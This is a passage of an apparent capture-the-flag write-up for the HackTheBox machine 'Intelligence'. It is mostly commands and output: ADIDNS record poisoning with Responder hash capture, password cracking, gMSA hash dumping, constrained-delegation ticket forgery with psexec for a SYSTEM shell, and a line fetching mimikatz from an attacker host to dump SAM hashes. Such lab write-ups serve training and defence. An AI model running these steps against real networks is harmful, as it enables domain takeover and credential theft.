<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span style="color:#50fa7b">#</span> <span style="color:#50fa7b">Check</span> <span style="color:#50fa7b">web</span> <span style="color:#50fa7b">server</span> <span style="color:#50fa7b">status.</span> <span style="color:#50fa7b">Scheduled</span> <span style="color:#50fa7b">to</span> <span style="color:#50fa7b">run</span> <span style="color:#50fa7b">every</span> <span style="color:#50fa7b">5min</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">Import-Module</span> <span style="color:#50fa7b">ActiveDirectory</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">foreach</span><span style="color:#f1fa8c">($record in Get-ChildItem &#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&#34; | Where-Object Name -like &#34;web*&#34;)</span>  {
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">try</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">$request</span> <span style="color:#50fa7b">=</span> <span style="color:#50fa7b">Invoke-WebRequest</span> <span style="color:#50fa7b">-Uri</span> <span style="color:#50fa7b">&#34;http:</span>/<span style="color:#8be9fd;font-style:italic">/$</span><span style="color:#f1fa8c">($record.Name)</span><span style="color:#50fa7b">&#34;</span> <span style="color:#50fa7b">-UseDefaultCredentials</span>
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">if</span><span style="color:#f1fa8c">(.StatusCode -ne 200)</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">Send-MailMessage</span> <span style="color:#50fa7b">-From</span> <span style="color:#50fa7b">&#39;Ted</span> <span style="color:#50fa7b">Graves</span> &lt;<span style="color:#50fa7b">Ted.Graves@intelligence.htb</span>&gt;<span style="color:#50fa7b">&#39;</span> <span style="color:#50fa7b">-To</span> <span style="color:#50fa7b">&#39;Ted</span> <span style="color:#50fa7b">Graves</span> &lt;<span style="color:#50fa7b">Ted.Graves@intelligence.htb</span>&gt;<span style="color:#50fa7b">&#39;</span> <span style="color:#50fa7b">-Subject</span> <span style="color:#50fa7b">&#34;Host:</span> <span style="color:#50fa7b">$</span><span style="color:#f1fa8c">($record.Name)</span> <span style="color:#50fa7b">is</span> <span style="color:#50fa7b">down&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  } <span style="color:#50fa7b">catch</span> {}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>The powershell script collect web records from ActiveDirectory and attempt to load the page. If HTTP code is not 200 (SUCCESS), then it send an email.
The interesting part of the script are:</p>
<ul>
<li>the web* record enumeration from AD.</li>
<li>the comment saying it is a cron job running every 5min</li>
</ul>
<p>There is a clear attack vector here: if we manage to create a dns record starting with web* and pointing to my attacker machine, then I would be able to either get IT Support guy Ted&rsquo;s hashes. It worth to explore AD and figure out if this is possible to add DNS records.</p>
<p>By default Windows ADIDNS (Active Directory Integrated DNS) zones allow any authenticated users to add/ modify/ delete DNS entries. Using this any user account in the AD can add new DNS records.</p>
<p><a href="https://github.com/Sagar-Jangam/DNSUpdate">DNSUpdate</a> is a python script to aid Responder in gathering more hashes, even from different VLANs, which by default is not possible with Responder. The scripts does so by updating DNS entries in ADIDNS zones. The script requires a set of valid domain credentials (User account/ Machine account with a password or hash) to update the ADIDNS zones.</p>
<pre><code>git clone https://github.com/Sagar-Jangam/DNSUpdate.git
cd DNSUpdate
pip3 install -r requirements.txt
</code></pre>
<ul>
<li>
<p>The script can be used with Responder&rsquo;s logs in analyze mode to identify records which have been requested by multiple hosts. These records are likely to be requested by hosts in other VLANs as well. Thus modifying the zones with these records (and pointing to Responder&rsquo;s IP) may allow us to gather hashes from different VLANs.</p>
</li>
<li>
<p>The script can also be used to add Wildcard DNS records which makes DNS works just as LLMNR and NBNS (which means all unresolved records would fall down to the wildcard record and thus resolve to Responder&rsquo;s IP).</p>
<pre><code>  python3 DNSUpdate.py -DNS 10.10.10.248 -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a ad -r webevilrecord -d 10.10.14.10
  Connecting to host...
  Binding to host
  Bind OK
  Adding the record
  {'result': 0, 'description': 'success', 'dn': '', 'message': '', 'referrals': None, 'type': 'addResponse'}
</code></pre>
</li>
</ul>
<p>Now we wait up-to 5 minutes for the cronjob with a responder listener and we cross fingers:</p>
<pre><code>sudo ./Responder.py -I eth0 -w -F
[..]
[+] Listening for events...

[HTTP] NTLMv2 Client   : 172.19.0.1
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:443211421179eceb:33E6EAAB028DE81EA80CE71299BFBA5D:0101000000000000B9B60E60D9C8D7014798886EB0254F8400000000020008004F004E0042004D0001001E00570049004E002D005600410033003600570049004F005000310032005700040014004F004E0042004D002E004C004F00430041004C0003003400570049004E002D005600410033003600570049004F0050003100320057002E004F004E0042004D002E004C004F00430041004C00050014004F004E0042004D002E004C004F00430041004C000800300030000000000000000000000000200000FD2DE1F77CDFB1D2825155B7318DE5483DB75260F8780517ED924D759490736E0A001000000000000000000000000000000000000900460048005400540050002F007700650062006500760069006C007200650063006F00720064002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
</code></pre>
<p><a href="https://github.com/dirkjanm/krbrelayx.git">krbrelayx</a> is another tool to abuse <strong>unconstrained</strong> delegation. It has a <code>dnstool.py</code> that can Add/modify/delete Active Directory Integrated DNS records via LDAP:</p>
<pre><code>python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a add -r web.intelligence.htb -d 10.10.14.10 10.10.10.248
ligence.htb -d 10.10.14.10 10.10.10.248
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
</code></pre>
<h3 id="crack-teds-password">crack Ted&rsquo;s password</h3>
<p>It took only one minute for hashcat to crack the hash with rockyou dictionary:</p>
<pre><code>cat Responder/logs/*txt &gt; ~/hashes.txt
hashcat -m 5600  ~/hashes.txt /opt/dictionaries/rockyou.txt -o ~/cracked.txt --force
tail -1 ~/cracked.txt| cut -d':' -f 7
Mr.Teddy
</code></pre>
<p>john was even faster, below 26 seconds, and could guess the hash format.</p>
<pre><code>/opt/john/run/john ~/hashes.txt --wordlist=/opt/dictionaries/rockyou.txt
/opt/john/run/john ~/hashes.txt --show --format=netntlmv2
Ted.Graves:Mr.Teddy:intelligence:443211421179eceb:33E6EAAB028DE81EA80CE71299BFBA5D:0101000000000000B9B60E60D9C8D7014798886EB0254F8400000000020008004F004E0042004D0001001E00570049004E002D005600410033003600570049004F005000310032005700040014004F004E0042004D002E004C004F00430041004C0003003400570049004E002D005600410033003600570049004F0050003100320057002E004F004E0042004D002E004C004F00430041004C00050014004F004E0042004D002E004C004F00430041004C000800300030000000000000000000000000200000FD2DE1F77CDFB1D2825155B7318DE5483DB75260F8780517ED924D759490736E0A001000000000000000000000000000000000000900460048005400540050002F007700650062006500760069006C007200650063006F00720064002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
</code></pre>
<p>We are not able to login as ted.graves with evil-winrm</p>
<h2 id="ldap-enumeration">LDAP enumeration</h2>
<pre tabindex="0"><code>sudo apt install ldap-utils
ldapsearch -h 10.10.10.248 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base &lt;&gt; (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingcontexts: DC=intelligence,DC=htb
namingcontexts: CN=Configuration,DC=intelligence,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=intelligence,DC=htb
namingcontexts: DC=DomainDnsZones,DC=intelligence,DC=htb
namingcontexts: DC=ForestDnsZones,DC=intelligence,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
</code></pre><p>We found two interesting domains that both resolve to this machine:</p>
<pre><code>dig @10.10.10.248 ForestDnsZones.intelligence.htb
dig @10.10.10.248 DomainDnsZones.intelligence.htb
</code></pre>
<p>We can also dump everything:</p>
<pre><code>ldapdomaindump -u INTELLIGENCE.HTB\\Tiffany.Molina  -p NewIntelligenceCorpUser9876 10.10.10.248
[..]
[+] Domain dump finished
$ls domain_*json
domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json  domain_users.json
</code></pre>
<p>In domain_users, few accounts pop-out, because of the whenChanged date field:</p>
<table>
<thead>
<tr>
<th>cn</th>
<th>sAMAccountName</th>
<th>primaryGroupId</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ted Graves</td>
<td>Ted.Graves</td>
<td>IT Support</td>
</tr>
<tr>
<td>Tiffany Molina</td>
<td>Tiffany.Molina</td>
<td></td>
</tr>
<tr>
<td>krbtgt</td>
<td>krbtgt</td>
<td>Replication Group</td>
</tr>
<tr>
<td>Administrator</td>
<td>Administrator</td>
<td>Group Policy Creator Owners, Domain Admins, Enterprise Admins, Schema Admins, Administrators</td>
</tr>
</tbody>
</table>
<p>In domain_computers, we find a workstation authorized for delegation. On AD, accounts, whether users or machines are being given permissions in the same way.</p>
<table>
<thead>
<tr>
<th>cn</th>
<th>sAMAccountName</th>
<th>dNSHostName</th>
<th>userAccountControl</th>
<th>objectSid</th>
</tr>
</thead>
<tbody>
<tr>
<td>svc_int</td>
<td>svc_int$</td>
<td>svc_int.intelligence.htb</td>
<td>WORKSTATION_ACCOUNT, <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code></td>
<td>S-1-5-21-4210132550-3389855604-3437519686-1144</td>
</tr>
</tbody>
</table>
<p>Another attack vector here, if we get a footprint on svc_int, We may be able to authenticate some other services or machines.</p>
<h2 id="ad-enumeration">AD Enumeration</h2>
<p>The following resources explain <strong>constrained delegation</strong> (as opposed to legacy way <strong>unconstrained delegation</strong>):</p>
<ul>
<li>
<p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation">Kerberos Constrained Delegation</a></p>
<pre><code>TRUSTED_TO_AUTH_FOR_DELEGATION - (Windows 2000/Windows Server 2003) The account is enabled for delegation.
This is a security-sensitive setting. Accounts that have this option enabled should be tightly controlled.
This setting lets a service that runs under the account assume a client's identity and authenticate
as that user to other remote servers on the network.
</code></pre>
</li>
<li>
<p><a href="https://www.onsecurity.io/blog/abusing-kerberos-from-linux/">Abusing Kerberos From Linux</a></p>
</li>
<li>
<p><a href="https://pypi.org/project/pywerview/">Pywerview</a> is Powershell from Linux. It&rsquo;s a complete rewrite of <a href="https://github.com/PowerShellMafia/PowerSploit">Powersploit</a>&rsquo;s <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">Powerview</a> unsing the incredible impacket, and it is easier to use from our attacker machine which has not yet joined the domain.</p>
<pre><code>  git clone https://github.com/the-useless-one/pywerview
  cd pywerview
  sudo python3 setup.py install
</code></pre>
</li>
</ul>
<p>We find consistent results aligned with our ldap enumeration: No users has delegation privileges, machine svc_int has delegation privileges.</p>
<pre><code>$ pywerview get-netuser -w intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -t dc.intelligence.htb | grep msds-allowedtodelegateto
$ pywerview get-netcomputer -w intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -t dc.intelligence.htb
dnshostname: svc_int.intelligence.htb
dnshostname: dc.intelligence.htb
$ pywerview get-netcomputer -w intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -t dc.intelligence.htb  --computername svc_int.intelligence.htb --full-data
[..]
$ pywerview get-netcomputer -w intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -t dc.intelligence.htb  --computername svc_int.intelligence.htb --attribute name msds-allowedtodelegateto useraccountcontrol
msds-allowedtodelegateto: WWW/dc.intelligence.htb
name:                     svc_int
useraccountcontrol:       ['WORKSTATION_TRUST_ACCOUNT', 'TRUSTED_TO_AUTH_FOR_DELEGATION']
</code></pre>
<p>It is now clear that from machine svc_int, we have delegation privileges on dc.intelligence.htb. What we are missing here are creds for svc_int but we can get the hash for them with impacket <code>gMSAdumper</code>:</p>
<pre><code>git clone https://github.com/micahvandeusen/gMSADumper
cd gMSADumper
python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l dc.intelligence.htb
Users or groups who can read password for svc_int$:
 &gt; DC$
 &gt; itsupport
svc_int$:::c699eaac79b69357d9dabee3379547e6
</code></pre>
<p>We can&rsquo;t crack this hash, but we can perform a Silver Ticket Attack:</p>
<h2 id="silver-ticket-attack">Silver ticket attack</h2>
<h3 id="obtain-a-silver-ticket">Obtain a silver ticket</h3>
<pre><code>python3 getST.py -dc-ip 10.10.10.248 -spn WWW/dc.intelligence.htb 'INTELLIGENCE.HTB/svc_int\$' -impersonate Administrator -hashes :c699eaac79b69357d9dabee3379547e6
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
</code></pre>
<p>There is problem with the clock that needs to be synced with AD:</p>
<pre><code>sudo apt-get install ntpdate
sudo apt-get install chrony
sudo timedatectl set-ntp true
sudo ntpdate  10.10.10.248
25 Oct 00:37:47 ntpdate[7818]: step time server 10.10.10.248 offset 25200.420074 sec
</code></pre>
<p>We can retrive the silver ticket:</p>
<pre><code>python3 getST.py -dc-ip 10.10.10.248 -spn WWW/dc.intelligence.htb 'INTELLIGENCE.HTB/svc_int\$' -impersonate Administrator -hashes :c699eaac79b69357d9dabee3379547e6
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
</code></pre>
<h3 id="kerberos-login-samba">Kerberos login Samba</h3>
<p>We can now reuse this ticket to connect cifs shares:</p>
<pre tabindex="0"><code>export KRB5CCNAME=Administrator.ccache
pip3 install pycrypto
python3 ./smbclient.py Administrator@dc.intelligence.htb -k -no-pass
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Type help for list of commands
# use C$
# cd Users/Administrator/Desktop
# cat root.txt
a9812c620864d1a0cc46204bfadfb96a
</code></pre><h3 id="obtain-an-admin-shell-with-psexec">Obtain an admin shell with psexec</h3>
<pre><code>python3 ./psexec.py intelligence.htb/Administrator@dc.intelligence.htb -k -no-pass -dc-ip 10.10.10.248 -port 445

Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on dc.intelligence.htb.....
[*] Found writable share ADMIN$
[*] Uploading file srIwNEUx.exe
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Creating service kVxd on dc.intelligence.htb.....
[*] Starting service kVxd.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt; cd ../../Users/Administrator/Desktop

C:\Users\Administrator\Desktop&gt; type root.txt
a9812c620864d1a0cc46204bfadfb96a
</code></pre>
<pre tabindex="0"><code>
A bit further exploration, we can even use powershell:
</code></pre><pre><code>C:\Users\Administrator\Desktop&gt; help

 lcd {path}                 - changes the current local directory to {path}
 exit                       - terminates the server process (and this session)
 lput {src_file, dst_path}   - uploads a local file to the dst_path RELATIVE to the connected share (ADMIN$)
 lget {file}                 - downloads pathname RELATIVE to the connected share (ADMIN$) to the current local dir
 ! {cmd}                    - executes a local shell cmd

C:\Windows\system32&gt; hostname
dc

C:\Windows\system32&gt; dir \\dc.intelligence.htb\C$
 Volume in drive \\dc.intelligence.htb\C$ has no label.
 Volume Serial Number is E3EF-EBBD

 Directory of \\dc.intelligence.htb\C$

04/18/2021  05:52 PM    &lt;DIR&gt;          inetpub
04/18/2021  05:50 PM    &lt;DIR&gt;          IT
06/29/2021  02:30 PM             5,510 License.txt
04/18/2021  05:38 PM    &lt;DIR&gt;          PerfLogs
04/18/2021  05:23 PM    &lt;DIR&gt;          Program Files
04/18/2021  05:21 PM    &lt;DIR&gt;          Program Files (x86)
04/18/2021  06:20 PM    &lt;DIR&gt;          Users
10/24/2021  10:47 AM    &lt;DIR&gt;          Windows
               1 File(s)          5,510 bytes
               7 Dir(s)   5,986,734,080 bytes free

C:\Windows\system32&gt; powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32&gt; [System.Security.Principal.WindowsIdentity]::GetCurrent()


AuthenticationType : Negotiate
ImpersonationLevel : None
IsAuthenticated    : True
IsGuest            : False
IsSystem           : True
IsAnonymous        : False
Name               : NT AUTHORITY\SYSTEM
Owner              : S-1-5-32-544
User               : S-1-5-18
Groups             : {S-1-5-32-544, S-1-1-0, S-1-5-11}
Token              : 3024
AccessToken        : Microsoft.Win32.SafeHandles.SafeAccessTokenHandle
UserClaims         : {http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name: NT AUTHORITY\SYSTEM,
                     http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid: S-1-5-18,
                     http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid: S-1-5-32-544,
                     http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid: S-1-1-0...}
DeviceClaims       : {}
Claims             : {http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name: NT AUTHORITY\SYSTEM,
                     http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid: S-1-5-18,
                     http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid: S-1-5-32-544,
                     http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid: S-1-1-0...}
Actor              :
BootstrapContext   :
Label              :
NameClaimType      : http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name
RoleClaimType      : http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid

PS C:\Windows\system32&gt; [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name

Name
----
NT AUTHORITY\SYSTEM

PS C:\Windows\system32&gt; Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    371      32    12220      20108       0.11   2208   0 certsrv
     85       5      908       4136       0.02   2264   0 CExecSvc
    102       6     2816       4768       0.03   1616   0 cmd
    166      11     6880      16100       0.11   3508   1 conhost
    122       8     6420      10656       0.05   4788   0 conhost
    395      16     2100       5304       0.28    356   0 csrss
    178       9     1700       4992       0.09    452   1 csrss
    394      32    16344      22864       1.19   2272   0 dfsrs
    185      12     2388       7824       0.02   2752   0 dfssvc
    255      13     4004      13676       0.13   3292   0 dllhost
  10373    7401   130804     128272       0.80   2332   0 dns
     49       6     1368       3984       0.06    808   0 fontdrvhost
     49       6     1488       4428       0.06    816   1 fontdrvhost
      0       0       56          8                 0   0 Idle
     88       7      960       3716       0.00   2856   0 IsJXdneN
    130      12     1960       5712       0.02   2400   0 ismserv
     97       7      984       3892       0.02   1112   0 kQHuUTqv
     98       8     1104       3776       0.02   3380   0 KWfRWZsr
    312      16     2964      13860       0.08   3436   1 LogonUI
   2012     177    70620      67384      13.13    584   0 lsass
    471      33    53444      67664       4.33   2252   0 Microsoft.ActiveDirectory.WebServices
    224      13     2912      10412       0.05   3712   0 msdtc
    566      30    52712      61800       2.55   4572   0 powershell
     83       6      892       3696       0.00   5072   0 QSdSjBVH
      0      11      248      16732       1.94     88   0 Registry
    488      12     4516      11128       0.80    572   0 services
     53       3      528       1232       0.28    256   0 smss
    118      14     3140       7396       0.05    292   0 svchost
    206      12     1700       7464       0.05    304   0 svchost
    211       9     2108       7732       0.09    568   0 svchost
    249      15     3000      12072       0.91    648   0 svchost
    293      13     9196      13692       5.98    724   0 svchost
    427       9     2792       9140       0.28    756   0 svchost
     86       5      888       3964       0.00    788   0 svchost
    293      12     2652       9268       0.19    824   0 svchost
    472      19     3324       9900       0.72    912   0 svchost
    217      11     2364      10132       1.75    928   0 svchost
    233      10     1676       6984       0.05    944   0 svchost
    231      12     2704       8876       0.44   1088   0 svchost
    119       7     1192       5560       0.02   1188   0 svchost
    316      17     3768      13096       0.45   1212   0 svchost
    376      31     7664      15268       0.50   1264   0 svchost
    205      12     2148       8860       0.53   1304   0 svchost
    210      11     2400       8764       0.50   1352   0 svchost
    133       7     1192       5892       0.00   1368   0 svchost
    155       8     1740       7192       0.11   1436   0 svchost
    176       9     1728       8408       0.03   1464   0 svchost
    404      16    10972      20216       8.47   1480   0 svchost
    458      16     3220      11856       0.17   1560   0 svchost
    233      24     3352      12492       0.11   1636   0 svchost
    356      16     4328      12544       0.19   1744   0 svchost
    277      10     2212       8424       0.19   1860   0 svchost
    166      12     3840      11020       0.09   2216   0 svchost
    119       7     1152       5612       0.00   2228   0 svchost
    389      18    14720      27880       1.66   2288   0 svchost
    137       8     1496       6304       0.00   2424   0 svchost
    229      14     4688      11908       0.08   2432   0 svchost
    219      12     2744      10348       0.08   2736   0 svchost
    292      16     4580      16916       0.17   3076   0 svchost
    147       9     1588       6584       0.02   4008   0 svchost
    247      14    10324      11528       3.17   4068   0 svchost
    281      20     8172      13576       0.11   5092   0 svchost
   1140       0      192        156      12.50      4   0 System
    213      16     2460      10808       0.09   3108   0 vds
    176      12     3292      10888       0.11   2728   0 VGAuthService
    377      22     8936      21912       2.05   2452   0 vmtoolsd
    171      11     1444       7052       0.11    432   0 wininit
    234      11     2564      10860       0.25    504   1 winlogon
    327      16     8500      17592      12.13   3428   0 WmiPrvSE
     83       6      888       3692       0.02   3232   0 xVBpPrAm
</code></pre>
<h2 id="mimikatz">mimikatz</h2>
<pre><code>powershell -c &quot;Invoke-WebRequest -Uri http://10.10.14.10/mimikatz.exe -OutFile mimikatz.exe&quot;
mimikatz.exe &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;
User : Administrator
  Hash NTLM: 0054cc2f7ff3b56d9e47eb39c89b521f
</code></pre>
<p>We can&rsquo;t crack this password on hashes.com</p>

      </div>
    </article>

    <hr />
      <div class="sharing-buttons">
        
<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-intelligence%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-intelligence%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%20-%20Intelligence&amp;caption=HTB%20-%20Intelligence&amp;canonicalUrl=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-intelligence%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="mailto:?subject=HTB%20-%20Intelligence&amp;body=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-intelligence%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-intelligence%2f&amp;media=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-intelligence%2f;description=HTB%20-%20Intelligence" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-intelligence%2f&amp;title=HTB%20-%20Intelligence&amp;summary=HTB%20-%20Intelligence&amp;source=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-intelligence%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
